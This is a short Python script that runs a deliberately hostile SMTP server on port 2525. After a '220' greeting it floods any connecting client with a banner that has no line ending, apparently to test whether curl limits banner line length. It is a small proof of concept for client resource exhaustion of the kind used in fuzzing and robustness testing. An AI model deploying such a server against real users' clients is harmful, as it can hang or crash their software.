import socket
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 2525))
sock.listen(5)

print("SMTP Malice Server Listening on 2525...")

while True:
    conn, addr = sock.accept()
    try:
        # SMTP starts with the server speaking first
        # Code 220 = Service ready
        conn.send(b"220 ")

        # THE ATTACK: Stream 1GB of text without a newline (\r\n)
        # This tests if curl enforces a max line length on the banner
        chunk = b"Welcome-to-the-infinite-server-" * 100

        t_end = time.time() + 5
        while time.time() < t_end:
            conn.send(chunk)

        conn.send(b"\r\n")  # Finally end the line

    except Exception as e:
        pass
    finally:
        conn.close()